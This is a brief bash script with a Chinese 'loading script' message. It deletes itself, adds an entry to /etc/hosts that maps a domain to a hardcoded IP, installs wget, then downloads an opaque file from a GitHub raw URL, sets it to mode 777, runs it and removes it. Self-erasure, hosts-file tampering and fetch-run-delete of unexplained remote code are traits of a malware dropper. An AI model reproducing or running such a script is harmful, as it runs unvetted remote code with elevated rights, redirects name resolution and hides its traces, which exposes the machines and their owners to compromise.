#!/bin/bash
rm -rf $0
echo "
68.183.232.34 sao.saoml.xyz" >> /etc/hosts
echo 正在载入脚本...
yum -y install wget;wget -q https://raw.githubusercontent.com/raindrop-hb/xyrlk/refs/heads/main/saoml/saoml6;chmod 777 saoml6 && (./saoml6;rm -rf saoml6)
